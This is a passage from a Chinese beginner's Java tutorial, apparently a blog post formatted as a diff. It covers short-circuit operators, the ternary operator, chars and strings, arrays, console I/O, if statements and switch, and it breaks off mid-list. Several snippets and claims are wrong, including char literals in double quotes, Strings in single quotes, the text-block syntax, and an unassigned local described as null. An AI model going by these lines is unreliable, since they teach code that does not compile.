+<p><strong>短路运算</strong></p>
+<p>首先了解一下短路运算的概念，它是布尔运算中的一个重要概念，短路运算在提前确定结果后就会停止后续结果的执行，直接返回结果。</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        boolean b = 5 &lt; 3;
+        boolean result = b &amp;&amp; (5 / 0 &gt; 0);
+        System.out.println(result);//false
+    &#125;
+&#125;
+</code></pre>
+<p>在以上代码中，<code>b</code>的值为<code> false</code>,而<code>b</code>和<code>（5 / 0 &gt; 0）</code>之间使用<code>&amp;&amp;</code>运算符，<code>b</code>已经为<code>false</code>，<code>result</code>的整体结果就已经注定是<code>false</code>，至于<code>(5 /0 &gt; 0)</code>已经不需要去管。</p>
+<p>如果没有短路运算，<code>&amp;&amp;</code>后面的表达式会由于除数为<code>0</code>而报错，但实际上该语句并未报错，原因在于与运算是短路运算符，提前计算出了结果<code>false</code>。</p>
+<p>如果变量<code>b</code>的值为<code>true</code>，则表达式变为<code>true &amp;&amp; (5 / 0 &gt; 0)</code>。因为无法进行短路运算，该表达式必定会由于除数为<code>0</code>而报错，可以自行测试。(&amp;&amp;运算符是第一个表达式为false则直接为false，而第一个表达式为true，它就需要确定&amp;&amp;之后的表达式，若表达式为false，整体结果依旧是false，如果表达式错误则程序会报错)</p>
+<p>如果将表达式换为:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        boolean b = 5 &gt; 3;//true
+        boolean result = b &amp;&amp; (5 / 0 &gt; 0);//注意这里b为true
+        System.out.println(result);//报错
+    &#125;
+&#125;
+</code></pre>
+<p>同理，如果将<code>&amp;&amp;</code>换为<code>||</code>,则结果为<code>true</code>，原因是<code>||</code>运算符中只要有一个结果为<code>true</code>，则整体结果为<code>true</code></p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        boolean b = 5 &gt; 3;//true
+        boolean result = b || (5 / 0 &gt; 0);//注意这里b为true
+        System.out.println(result);//true
+    &#125;
+&#125;
+</code></pre>
+<p><strong>三元运算符</strong></p>
+<p>三元运算符也叫三目运算符，它根据第一个布尔表达式的结果，分别返回后续两个表达式之一的计算结果。示例：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int n = -100;
+        int x = n &gt;= 0 ? n : -n;//三元运算
+        System.out.println(x);//100
+    &#125;
+&#125;
+</code></pre>
+<p>上述语句的意思是，判断<code>n &gt;= 0</code>是否成立，如果为<code>true</code>，则返回<code>n</code>，否则返回<code>-n</code>。这实际上是一个求绝对值的表达式。</p>
+<p>注意到三元运算<code>b ? x : y</code>会首先计算<code>b</code>，如果<code>b</code>为<code>true</code>，则只计算<code>x</code>，否则，只计算<code>y</code>。此外，<code>x</code>和<code>y</code>的类型必须相同，因为返回值不是<code>boolean</code>，而是<code>x</code>和<code>y</code>之一。</p>
+<p>如果对三元运算没有掌握的话，做一个小练习：输入一个年龄，如果年龄在6-12岁，屏幕打印该生是小学生，否则打印该生不是。</p>
+<pre><code class="java">public class Test&#123;
+    public static void main(String[] args)&#123;
+        System.out.print(&quot;请输入该生年龄：&quot;);
+        int age = new Scanner(System.in).nextInt();
+        int flag = age &gt;= 6 &amp;&amp; age &lt;=12 ? 1 : 0;
+        switch (flag)&#123;
+            case 1:
+                System.out.print(&quot;该生是小学生&quot;);
+                break;
+            case 0:
+                System.out.print(&quot;该生不是小学生&quot;);
+                break;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210911170633085.png" alt="image-20210911170633085"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210911170651064.png" alt="image-20210911170651064"></p>
+<p>关于这道练习题，还有更加简单的方法来实现，不妨开动你们聪明的大脑来实现吧！</p>
+<h4 id="字符和字符串"><a href="#字符和字符串" class="headerlink" title="字符和字符串"></a>字符和字符串</h4><h5 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h5><p>首先明确一点：在Java中，字符和字符串是两个不同的类型。</p>
+<p>字符类型<code>char</code>是基本数据类型，它是<code>character</code>的缩写。一个<code>char</code>保存一个Unicode字符：</p>
+<pre><code class="java">char c1 = &#39;A&#39;;
+char c2 = &#39;中&#39;;
+</code></pre>
+<p>因为Java在内存中总是使用Unicode表示字符，所以，一个英文字符和一个中文字符都用一个<code>char</code>类型表示，它们都占用两个字节。要显示一个字符的Unicode编码，只需将<code>char</code>类型直接赋值给<code>int</code>类型即可：</p>
+<pre><code class="java">int c1 = &#39;A&#39;;
+int c2 = &#39;中&#39;;
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210914135737352.png" alt="image-20210914135649201"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210914224444734.png" alt="image-20210914224444734"></p>
+<p><code>A</code>的Unicode码是65，<code>中</code>的Unicode码是20013</p>
+<p>除此之外，还可以使用”\u”+Unicode码表示一个字符：</p>
+<pre><code class="java">char c1 = &quot;\u0041&quot;;
+char c2 = &quot;\u4e2d&quot;;
+</code></pre>
+<p>在16进制表示法中，<code>0041</code>表示十进制的<code>65</code>,<code>4e2d</code>就是十进制的<code>20013</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210915201328569.png"></p>
+<h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p>与字符类型不同的是，字符串类型String是引用类型，可存储0到任意个字符，使用<code>&quot;字符串&quot;</code>来表示字符串类型的数据：</p>
+<pre><code class="java">String str = &quot;我是一个字符串！&quot;;
+String str1 = new String(&quot;我是字符串2！&quot;);
+</code></pre>
+<p><strong>转义字符：</strong></p>
+<p>字符串的表示方式使用<code>&quot;&quot;</code>或<code>&#39;&#39;</code>来进行包裹，万一在字符串中正好有<code>&quot;</code>或者<code>&#39;</code>怎么办呢？这个时候可以使用转义字符<code>\</code>来进行操作：</p>
+<pre><code class="java">String str = &quot;I\&#39;m a Student!&quot;;
+</code></pre>
+<p>测试一下：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210915202414025.png" alt="image-20210915202414025"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210915202441449.png" alt="image-20210915202441449"></p>
+<p>结果显而易见！</p>
+<p><strong>转义字符的分歧</strong></p>
+<p>因为<code>\</code>本身就是转义字符，所以表示<code>\</code>本身时使用<code>\\</code>：</p>
+<pre><code class="java">String str2 = &quot;\\&quot;;
+        System.out.println(str2);
+</code></pre>
+<p>常见的转义字符包括：</p>
+<ul>
+<li><code>\&quot;</code> 表示字符<code>&quot;</code></li>
+<li><code>\&#39;</code> 表示字符<code>&#39;</code></li>
+<li><code>\\</code> 表示字符<code>\</code></li>
+<li><code>\n</code> 表示换行符</li>
+<li><code>\r</code> 表示回车符</li>
+<li><code>\t</code> 表示Tab</li>
+<li><code>\u####</code> 表示一个Unicode编码的字符</li>
+</ul>
+<p><strong>字符串连接</strong></p>
+<p>字符串的连接使用<code>+</code></p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        String str = &quot;Hello,&quot;;
+        String str1 = &quot;World!&quot;;
+        String str2 = str+str1;
+        System.out.println(str2);
+    &#125;
+&#125;
+</code></pre>
+<p>如果用<code>+</code>连接字符串和其他数据类型，会将其他数据类型先自动转型为字符串，再连接：</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        int age = 20;
+        String str = &quot;Age is &quot;;
+        String str1 = str + age + &quot;years old!&quot;;
+        System.out.println(str1);
+    &#125;
+&#125;
+</code></pre>
+<p><strong>多行字符串：</strong></p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        String str = &quot;I\&#39;m Ok,\n&quot;
+            +&quot;Thank you!\n&quot;
+            +&quot;And you?&quot;;
+        System.out.println(str);
+    &#125;
+&#125;
+</code></pre>
+<p>用如上方法表示多行字符串是非常麻烦的，在Java13开始提供了一个重要特性，在表示多行字符串时使用<code>&#39;&#39;&#39; ...&#39;&#39;&#39;</code></p>
+<p>举个栗子：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String str = &quot;&quot;&quot;
+                   SELECT * FROM
+                     users
+                   WHERE id &gt; 100
+                   ORDER BY name DESC
+                   &quot;&quot;&quot;;
+        System.out.println(str);
+    &#125;
+&#125;
+</code></pre>
+<p>上述多行字符串实际上是5行，在最后一个<code>DESC</code>后面还有一个<code>\n</code>。如果我们不想在字符串末尾加一个<code>\n</code>，就需要这么写：</p>
+<pre><code class="java">String s = &quot;&quot;&quot; 
+           SELECT * FROM
+             users
+           WHERE id &gt; 100
+           ORDER BY name DESC&quot;&quot;&quot;;
+</code></pre>
+<p>还需要注意到，多行字符串前面共同的空格会被去掉，即：</p>
+<pre><code class="java">String s = &quot;&quot;&quot;
+...........SELECT * FROM
+...........  users
+...........WHERE id &gt; 100
+...........ORDER BY name DESC
+...........&quot;&quot;&quot;;
+</code></pre>
+<p>用<code>.</code>标注的空格都会被去掉。</p>
+<p>如果多行字符串的排版不规则，那么，去掉的空格就会变成这样：</p>
+<pre><code class="java">String s = &quot;&quot;&quot;
+.........  SELECT * FROM
+.........    users
+.........WHERE id &gt; 100
+.........  ORDER BY name DESC
+.........  &quot;&quot;&quot;;
+</code></pre>
+<p>即总是以最短的行首空格为基准。</p>
+<p><strong>字符串的不可变特性</strong></p>
+<pre><code class="java">public class StringTest&#123;
+    public static void main(String[] args)&#123;
+        String s = &#39;Hello&#39;;//打印s是Hello
+        System.out.println(s);
+        s = &#39;World!&#39;//打印s是World！
+        System.out.println(s);
+    &#125;
+&#125;
+</code></pre>
+<p>上述代码中的<code>s</code>在重新赋值后打印结果发生了变化，是s本身的值发生了变化吗？其实并不是，只是s将结果的内存地址指向了另一个字符串。</p>
+<p>执行<code>String s = &quot;Hello&quot;;</code>时，JVM虚拟机先创建字符串<code>&quot;Hello&quot;</code>，然后，把字符串变量<code>s</code>指向它：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210915210059713.png" alt="image-20210915210059713"></p>
+<p>而紧接着执行<code>s = &#39;World!&#39;</code>之后,JVM虚拟机创建字符串<code>&quot;World!&quot;</code>,然后把字符串变量<code>s</code>指向它:</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210915210321212.png" alt="image-20210915210321212"></p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        String s = &quot;hello&quot;;
+        String t = s;
+        s = &quot;world&quot;;
+        System.out.println(t);
+    &#125;
+&#125;
+</code></pre>
+<p>思考上述代码,t是”hello”还是”world”?</p>
+<p>答案: <code>t并没有重新赋值为s，所以t的值依旧保留为&quot;hello&quot;,如果在打印前补上一句:t = s;那么t的值便是&quot;world&quot;</code></p>
+<p><strong>空值null</strong></p>
+<p>引用类型的变量可以指向一个空值<code>null</code>，它表示不存在，即该变量不指向任何对象。例如：</p>
+<pre><code class="java">String s1 = null; // s1是null
+String s2; // 没有赋初值值，s2也是null
+String s3 = s1; // s3也是null
+String s4 = &quot;&quot;; // s4指向空字符串，不是null
+</code></pre>
+<p>注意要区分空值<code>null</code>和空字符串<code>&quot;&quot;</code>，空字符串是一个有效的字符串对象，它不等于<code>null</code>。</p>
+<h4 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h4><p>如果有一组相同类型的数据，可以这么表示:</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        int n1 = 98;
+        int n2 = 100;
+        int n3 = 99;
+        int n4 = 70;
+        int n5 = 78;
+    &#125;
+&#125;
+</code></pre>
+<p>以上方法表示太繁琐，也太复杂，可以使用数组来表示：</p>
+<pre><code class="java">public class Main&#123;
+    public static void main(String[] args)&#123;
+        int[] arr = new int[5];
+        arr[0] = 98;
+        arr[1] = 100;
+        arr[2] = 99;
+        arr[3] = 70;
+        arr[4] = 78;
+        System.out.println(Arrays.toString(arr));
+    &#125;
+&#125;
+</code></pre>
+<p>定义一个数组类型的变量，使用数组类型“类型[]”，例如，<code>int[]</code>。和单个基本类型变量不同，数组变量初始化必须使用<code>new int[5]</code>表示创建一个可容纳5个<code>int</code>元素的数组。</p>
+<p>Java的数组有几个特点：</p>
+<ul>
+<li>数组所有元素初始化为默认值，整型都是<code>0</code>，浮点型是<code>0.0</code>，布尔型是<code>false</code>；</li>
+<li>数组一旦创建后，大小就不可改变。</li>
+</ul>
+<p>要访问数组中的某一个元素，需要使用索引。数组索引从<code>0</code>开始，例如，5个元素的数组，索引范围是<code>0</code>~&#96;4&#96;。</p>
+<p>可以修改数组中的某一个元素，使用赋值语句，例如，<code>arr[1] = 79;</code>。</p>
+<p>可以用<code>数组变量.length</code>获取数组大小：</p>
+<pre><code class="java">public class ArrayTest&#123;
+    public static void main(String[] args)&#123;
+        int[] arr = new int[5];
+        arr[0] = 98;
+        arr[1] = 100;
+        arr[2] = 99;
+        arr[3] = 70;
+        arr[4] = 78;
+        System.out.println(arr.length);//5
+    &#125;
+&#125;
+</code></pre>
+<p>除此之外，数组还有一种简单的创建方式：</p>
+<pre><code class="java">public class ArrayTest&#123;
+    public static void main(String[] args)&#123;
+        int[] arr = &#123;90,78,100,99,98&#125;;
+        System.out.println(arr.length);//5
+    &#125;
+&#125;
+</code></pre>
+<p>这种创建方式最大的优点就是不用指定数组大小，编译器可以直接推算出数组大小</p>
+<p>数组是<strong>引用类型</strong>，在使用索引访问数组元素时，如果索引超出范围，运行时将报错：</p>
+<pre><code class="java">public class ArrayTest&#123;
+    public static void main(String[] args)&#123;
+        int[] arr = new int[5];
+        int n = 5;
+        System.out.println(arr[n]); // 索引n不能超出范围
+    &#125;
+&#125;
+</code></pre>
+<p><strong>数组是引用类型且大小不可变</strong></p>
+<pre><code class="java">public class ArrayTest&#123;
+    public static void main(String[] args)&#123;
+        int[] arr = &#123;1,2,3,4,5&#125;;
+        System.out.println(Arrays.toString(arr));//1,2,3,4,5
+        arr = new int[]&#123;1,2,3&#125;;
+        System.out.println(Arrays.toString(arr));//1,2,3
+    &#125;
+&#125;
+</code></pre>
+<p>与String同理，arr指向{1,2,3,4,5}的内存地址，在执行<code>arr = new int[]&#123;1,2,3&#125;;</code>这句代码之后，arr指向{1,2,3}这组数的内存地址。</p>
+<p>原有5个数的数组没有改变，只是无法使用变量arr来引用它们。</p>
+<p><strong>字符串数组</strong></p>
+<pre><code class="java">public class StringArrayTest&#123;
+    public static void main(String[] args)&#123;
+        String[] names = &#123;&quot;Tom&quot;,&quot;Alice&quot;,&quot;Jack&quot;,&quot;James&quot;&#125;;
+        System.out.println(Arrays.toString(names));
+        names[0] = &quot;Bob&quot;;
+        System.out.println(Arrays.toString(names));
+    &#125;
+&#125;
+</code></pre>
+<p>在以上代码中，<code>String[] names = &#123;&quot;Tom&quot;,&quot;Alice&quot;,&quot;Jack&quot;,&quot;James&quot;&#125;;</code>定义了一个String类型有四位元素的数组，在执行完<code>names[1] = &quot;Bob&quot;;</code>这句代码后，<code>Tom</code>就会被替换成<code>Bob</code></p>
+<p>这并不是names指向了一个新的数组{“Bob”,”Alice”,”Jack”,”James”},而是names的元素names[0]指向了一个新的值”Bob”,在数组中每个值的指向都是独立的。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210916154445754.png" alt="image-20210916154445754"></p>
+<h2 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h2><p>在Java程序中，JVM默认总是顺序执行以分号<code>;</code>结束的语句。但是，在实际的代码中，程序经常需要做条件判断、循环，因此，需要有多种流程控制语句，来实现程序的跳转和循环等功能。</p>
+<h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p>在使用流程控制之前，先学习输入输出：</p>
+<p><strong>输出：</strong></p>
+<p>在前面的代码中，我们总是使用<code>System.out.println()</code>来向屏幕输出一些内容。</p>
+<p><code>println</code>是print line的缩写，表示输出并换行。因此，如果输出后不想换行，可以用<code>print()</code>：</p>
+<pre><code class="java">public class InOrOutTest&#123;
+    public static void main(String[] args)&#123;
+        System.out.print(&quot;A,&quot;);
+        System.out.print(&quot;B,&quot;);
+        System.out.print(&quot;C.&quot;);
+        System.out.println();
+        System.out.println(&quot;This line is next&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p><strong>格式化输出：</strong></p>
+<p>Java还提供了格式化输出，因为适合电脑阅读的内容不一定适合我们人类：</p>
+<pre><code class="java">public class FormatOut&#123;
+    public static void main(String[] args)&#123;
+        double d = 1270000000;
+        System.out.println(d);//1.27e9
+    &#125;
+&#125;
+</code></pre>
+<p>如果要把数据显示成我们期望的格式，就需要使用格式化输出的功能。格式化输出使用<code>System.out.printf()</code>，通过使用占位符<code>%?</code>，<code>printf()</code>可以把后面的参数格式化成指定格式：</p>
+<pre><code class="java">public class FormatOut &#123;
+    public static void main(String[] args) &#123;
+        double d = 3.1415926;
+        System.out.printf(&quot;%.2f\n&quot;, d); // 显示两位小数3.14
+        System.out.printf(&quot;%.4f\n&quot;, d); // 显示4位小数3.1416
+    &#125;
+&#125;
+</code></pre>
+<p>Java的格式化功能提供了多种占位符，可以把各种数据类型“格式化”成指定的字符串：</p>
+<table>
+<thead>
+<tr>
+<th>占位符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%d</td>
+<td>格式化输出整数</td>
+</tr>
+<tr>
+<td>%x</td>
+<td>格式化输出十六进制整数</td>
+</tr>
+<tr>
+<td>%f</td>
+<td>格式化输出浮点数</td>
+</tr>
+<tr>
+<td>%e</td>
+<td>格式化输出科学计数法表示的浮点数</td>
+</tr>
+<tr>
+<td>%s</td>
+<td>格式化字符串</td>
+</tr>
+</tbody></table>
+<p>注意，由于%表示占位符，因此，连续两个%%表示一个%字符本身。</p>
+<p>占位符本身还可以有更详细的格式化参数。下面的例子把一个整数格式化成十六进制，并用0补足8位：</p>
+<pre><code class="java">public class FormatOut &#123;
+    public static void main(String[] args) &#123;
+        int n = 12345000;
+        System.out.printf(&quot;n=%d, hex=%08x&quot;, n, n); // 注意，两个%占位符必须传入两个数
+    &#125;
+&#125;
+</code></pre>
+<p>运行结果:</p>
+<p><img src="/./Java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0.assets/image-20210916161022033.png" alt="image-20210916161022033"></p>
+<p><strong>输入：</strong></p>
+<p>输入使用的是Scanner，首先看一下比输出复杂的输入如何实现:</p>
+<pre><code class="java">public class ScannerTest&#123;
+    public static void main(String[] args)&#123;
+        Scanner in = new Scanner(System.in);
+        System.out.print(&quot;请输入一个数：&quot;);
+        int num = in.nextInt();
+        if(num % 2 == 0)&#123;
+            System.out.println(num + &quot;是一个偶数！&quot;);
+        &#125;else&#123;
+            System.out.println(num + &quot;是一个奇数！&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>通过<code>import</code>语句导入<code>java.util.Scanner</code>，<code>import</code>是导入某个类的语句，必须放到Java源代码的开头，后面我们在Java的<code>package</code>中会详细讲解如何使用<code>import</code>。</p>
+<p>然后，创建<code>Scanner</code>对象并传入<code>System.in</code>。<code>System.out</code>代表标准输出流，而<code>System.in</code>代表标准输入流。直接使用<code>System.in</code>读取用户输入虽然是可以的，但需要更复杂的代码，而通过<code>Scanner</code>就可以简化后续的代码。</p>
+<p>有了<code>Scanner</code>对象后，要读取用户输入的字符串，使用<code>scanner.nextLine()</code>，要读取用户输入的整数，使用<code>scanner.nextInt()</code>。<code>Scanner</code>会自动转换数据类型，因此不必手动转换。</p>
+<h3 id="if控制语句"><a href="#if控制语句" class="headerlink" title="if控制语句"></a>if控制语句</h3><p><strong>基本语法：</strong></p>
+<pre><code class="java">if(boolean)&#123;
+    //true
+&#125;
+</code></pre>
+<p>if关键字后面的括号是一个条件且为布尔类型，可以使用诸如： <code>i == 2</code> <code>x + y == 2</code>等等</p>
+<p>如果括号内条件为真则执行花括号里的代码块</p>
+<pre><code class="java">public class IfTest&#123;
+    public static void main(String[] args)&#123;
+        int i = 2;
+        if(i == 2)&#123;
+            System.out.print(&quot;i结果为2！&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>if嵌套：</strong></p>
+<p>if可以嵌套else继续使用，假设有一个条件但是有两种结果，那你怎么去执行第二种结果呢？再写一个if吗？显然是不可能的。</p>
+<pre><code class="java">public class IfTest&#123;
+    public static void main(String[] args)&#123;
+        int i = 1;
+        if(i == 2)&#123;
+            System.out.print(&quot;i结果为2！&quot;);
+        &#125;else&#123;
+            System.out.print(&quot;i结果不为2！&quot;);//被执行
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>除此之外，还可以在else后面加上if：</p>
+<pre><code class="java">public class IfTest &#123;
+    public static void main(String[] args) &#123;
+        System.out.print(&quot;请输入1-3的整数:&quot;);
+        Scanner in = new Scanner(System.in);
+        int i = in.nextInt();
+        if(i == 1) &#123;
+            System.out.println(&quot;i为1！&quot;);
+        &#125;else if(i == 2) &#123;
+            System.out.println(&quot;i为2！&quot;);
+        &#125;else if(i == 3) &#123;
+            System.out.println(&quot;i为3！&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>使用if判断引用类型对象相等：</strong></p>
+<p>&lt;1&gt;</p>
+<pre><code class="java">public class IfTest &#123;
+    public static void main(String[] args) &#123;
+        String str = &quot;HELLO&quot;;
+        String str2 = &quot;hello&quot;.toUpperCase();
+        if(str==str2) &#123;
+            System.out.println(&quot;str == str2&quot;);
+        &#125;else &#123;
+            System.out.println(&quot;str != str2&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>&lt;2&gt;</p>
+<pre><code class="java">public class IfTest &#123;
+    public static void main(String[] args) &#123;
+        String str = &quot;HELLO&quot;;
+        String str2 = &quot;hello&quot;.toUpperCase();
+        if(str.equals(str2)) &#123;
+            System.out.println(&quot;str equals str2&quot;);
+        &#125;else &#123;
+            System.out.println(&quot;str !equals str2&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>&lt;3&gt;</p>
+<pre><code class="java">public class IfTest &#123;
+    public static void main(String[] args) &#123;
+        String str = null;
+        String str2 = &quot;HELLO&quot;;
+        if(str.equals(str2)) &#123;
+            System.out.println(&quot;str equals str2&quot;);
+        &#125;else &#123;
+            System.out.println(&quot;str !equals str2&quot;);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>在引用类型对象比较中， &#x3D;&#x3D; 用来表示两个变量的引用地址是否一致，很显然在代码1中，“HELLO” 和 “hello”.toUpperCase()值是一致的，都是”HELLO”,但内存地址就是不同，所以结果只能是 str !&#x3D; str2   在代码2中，由于使用了equals运算符进行比较，它只会比较两个值是否相等，很显然两个值是相等的，所以结果必然是 str equals str2  在代码3中，str &#x3D; null,它指向一个空地址，所以会报错：java.lang.NullPointException</strong></p>
+<h4 id="和-equals的区别及应用场景"><a href="#和-equals的区别及应用场景" class="headerlink" title="&#x3D;&#x3D; 和 equals的区别及应用场景"></a>&#x3D;&#x3D; 和 equals的区别及应用场景</h4><p>​		&lt;1&gt;对于&#x3D;&#x3D;，如果作用于基本数据类型的变量，则直接比较其存储的 “值”是否相等；</p>
+<p>　　　　如果作用于引用类型的变量，则比较的是所指向的对象的地址</p>
+<p>　　&lt;2&gt;对于equals方法，注意：<strong>equals方法不能作用于基本数据类型的变量</strong></p>
+<p>　　　　如果没有对equals方法进行重写，则比较的是引用类型的变量所指向的对象的地址。</p>
+<p>　　　　诸如String、Date等类对equals方法进行了重写的话，比较的是所指向的对象的内容。</p>
+<p>要避免<strong>java.lang.NullPointException</strong>错误，可以使用**&amp;&amp;**运算符来避免：</p>
+<pre><code class="java">public class IfTest &#123;
+    public static void main(String[] args) &#123;
+        String str = null;
+        String str2 = &quot;Hello&quot;;
+        if(str != null &amp;&amp; str.equals(str2))&#123;
+            System.out.println(&quot;str equals str2&quot;);
+        &#125;else&#123;
+            System.out.println(&quot;str !equals str2&quot;);
+        &#125;
+    &#125;
+
+&#125;
+</code></pre>
+<p>运行结果:</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210916201148893.png" alt="image-20210916201148893">	</p>
+<p><strong>小结：</strong></p>
+<p><code>if ... else</code>可以做条件判断，<code>else</code>是可选的；</p>
+<p>不推荐省略花括号<code>&#123;&#125;</code>；</p>
+<p>多个<code>if ... else</code>串联要特别注意判断顺序；</p>
+<p>要注意<code>if</code>的边界条件；</p>
+<p>要注意浮点数判断相等不能直接用<code>==</code>运算符；</p>
+<p>引用类型判断内容相等要使用<code>equals()</code>，注意避免<code>NullPointerException</code>。</p>
+<h3 id="switch控制语句"><a href="#switch控制语句" class="headerlink" title="switch控制语句"></a>switch控制语句</h3><p>除if之外还有一种表达式可以根据条件执行不同分支：switch</p>
+<pre><code class="java">public class SwitchTest &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;1.单人模式\n&quot;
+        +&quot;2.双人模式\n&quot;
+        +&quot;3.练习模式\n&quot;);
+        System.out.print(&quot;请输入游戏模式:&quot;);
+        int option = new Scanner(System.in).nextInt();
+        switch (option)&#123;
+            case 1:
+                System.out.println(&quot;已进入单人模式&quot;);
+            break;
+            case 2:
+                System.out.println(&quot;已进入双人模式&quot;);
+            break;
+            case 3:
+                System.out.println(&quot;已进入练习模式&quot;);
+            break;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>如果<code>option</code>的值没有匹配到任何<code>case</code>，例如<code>option = 99</code>，那么，<code>switch</code>语句不会执行任何语句。这时，可以给<code>switch</code>语句加一个<code>default</code>，当没有匹配到任何<code>case</code>时，执行<code>default</code>：</p>
+<pre><code class="java">public class SwitchTest &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;1.单人模式\n&quot;
+        +&quot;2.双人模式\n&quot;
+        +&quot;3.练习模式\n&quot;);
+        System.out.print(&quot;请输入游戏模式:&quot;);
+        int option = new Scanner(System.in).nextInt();
+        switch (option)&#123;
+            case 1:
+                System.out.println(&quot;已进入单人模式&quot;);
+            break;
+            case 2:
+                System.out.println(&quot;已进入双人模式&quot;);
+            break;
+            case 3:
+                System.out.println(&quot;已进入练习模式&quot;);
+            break;
+            default:
+                System.out.println(&quot;No selected&quot;);
+            break;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>如果把<code>switch</code>语句翻译成<code>if</code>语句，那么上述的代码相当于：</p>
+<pre><code class="java">if (option == 1) &#123;
+    System.out.println(&quot;已进入单人模式&quot;);
+&#125; else if (option == 2) &#123;
+    System.out.println(&quot;已进入双人模式&quot;);
+&#125; else if (option == 3) &#123;
+    System.out.println(&quot;已进入练习模式&quot;);
+&#125; else &#123;
+    System.out.println(&quot;No selected&quot;);
+&#125;
+</code></pre>
+<p>对于多个<code>==</code>判断的情况，使用<code>switch</code>结构更加清晰。</p>
+<p>同时注意，上述“翻译”只有在<code>switch</code>语句中对每个<code>case</code>正确编写了<code>break</code>语句才能对应得上。</p>
+<p>使用<code>switch</code>时，注意<code>case</code>语句并没有花括号<code>&#123;&#125;</code>，而且，<code>case</code>语句具有“<em>穿透性</em>”，<strong>漏写<code>break</code>将导致意想不到的结果。</strong></p>
+<p><strong>使用<code>switch</code>语句时，只要保证有<code>break</code>，<code>case</code>的顺序不影响程序逻辑：</strong></p>
+<pre><code class="java">public class SwitchTest &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;1.单人模式\n&quot;
+        +&quot;2.双人模式\n&quot;
+        +&quot;3.练习模式\n&quot;);
+        System.out.print(&quot;请输入游戏模式:&quot;);
+        int option = new Scanner(System.in).nextInt();
+        switch (option)&#123;
+            case 3:
+                System.out.println(&quot;已进入练习模式&quot;);
+            break;
+            case 1:
+                System.out.println(&quot;已进入单人模式&quot;);
+            break;
+            case 2:
+                System.out.println(&quot;已进入双人模式&quot;);
+            break;
+            default:
+                System.out.println(&quot;No selected&quot;);
+            break;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><code>switch</code>语句还可以匹配<strong>字符串</strong>。字符串匹配时，是比较“内容相等”。例如：</p>
+<pre><code class="java">public class SwitchTest &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;apple\n&quot;
+        +&quot;orange\n&quot;
+        +&quot;3.banana\n&quot;);
+        System.out.print(&quot;请输入想吃的水果:&quot;);
+        String option = new Scanner(System.in).nextLine();
+        switch (option)&#123;
+            case &quot;apple&quot;:
+                System.out.println(&quot;您选择吃苹果！&quot;);
+            break;
+            case &quot;orange&quot;:
+                System.out.println(&quot;您选择吃橘子！&quot;);
+            break;
+            case &quot;banana&quot;:
+                System.out.println(&quot;您选择吃香蕉！&quot;);
+            break;
+            default:
+                System.out.println(&quot;No selected&quot;);
+            break;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>编译检查</strong></p>
+<p>使用IDE时，可以自动检查是否漏写了<code>break</code>语句和<code>default</code>语句，方法是打开IDE的编译检查。</p>
+<p>在Eclipse中，选择<code>Preferences</code> - <code>Java</code> - <code>Compiler</code> - <code>Errors/Warnings</code> - <code>Potential programming problems</code>，将以下检查标记为Warning：</p>
+<ul>
+<li>‘switch’ is missing ‘default’ case</li>
+<li>‘switch’ case fall-through</li>
+</ul>
+<p>在IDEA中，选择<code>File </code>- <code>Settings</code> - <code>Editor</code> - <code>Inspections</code> - <code>Java</code> - <code>Control flow issues</code>，将以下检查标记为Warning：</p>
+<ul>
